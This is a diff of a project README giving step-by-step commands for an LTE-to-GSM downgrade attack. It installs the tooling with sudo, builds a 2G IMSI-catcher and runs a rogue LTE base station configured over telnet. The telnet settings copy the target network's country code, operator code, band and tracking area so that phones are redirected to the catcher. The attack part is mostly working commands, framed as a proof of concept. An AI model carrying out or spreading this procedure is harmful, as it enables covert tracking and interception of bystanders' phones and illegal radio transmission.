@@ -3,6 +3,17 @@
 Follow this readme :  
 https://github.com/bbaranoff/openLTE2GSM/
 
+
+```
+git clone https://github.com/bbaranoff/openLTE2GSM/
+```
+```
+sudo chmod +x install.sh
+```
+```
+sudo ./install.sh
+```
+
 The bash script is :  
 sudo apt update  
 wget https://github.com/bbaranoff/openLTE2GSM/releases/download/v0.1/uhd_20211230-1_amd64.deb  
@@ -21,11 +32,16 @@ sudo apt install libboost-date-time1.67.0 libboost-filesystem1.67.0 libboost-reg
 echo "Done !!!!"
 
 
-OTHER INSTALLATION :  
-sudo apt install libboost-program-options1.67.0 libboost-thread1.67.0 libusb-1.0-0 usbutils python-is-python3 python3-requests  
-sudo apt install libfftw3-3
+# OTHER INSTALLATION :  
 
-* Installing 2G IMSI-Catcher
+```
+sudo apt install libboost-program-options1.67.0 libboost-thread1.67.0 libusb-1.0-0 usbutils python-is-python3 python3-requests  
+```
+```
+sudo apt install libfftw3-3
+```
+
+* Installing 2G IMSI-Catcher with ARFCN 514
 Then build 2G IMSI-Catcher  
 Build IMSI-catcher  
 
@@ -36,24 +52,44 @@ This article is in progress and is just a PoC
 The attack step are run the IMSI-catcher into arfcn 514 follow (see Build IMSI-catcher)  
 run the 4G redirector as follow  
   
-Shell #1  
+# Shell #1  
+```
 LTE_fdd_enodeb
+```
 
-Shell #2  
+# Shell #2  
+```
 telnet localhost 30000  
+```
+```
 write rx_gain 30  
+```
+```
 write tx_gain 80  
+```
+```
 write mcc 215  
+```
+```
 write mnc 15  
+```
+```
 write band 7  
+```
+```
 write dl_earfcn 3350  
+```
+```
 write tracking_area_code 6604   
+```
 
 (change with your ue values be careful that the earfcn is in the band)  
   
 Then switch the phone in airplane mode and in  localhost:30000 (Shell #2) :  
+```
 start  
-  
+```
+
 wait… and when you have “ok” answer in shell #2 remove airplane mode and … enjoy !
 
 * Video explaining :  
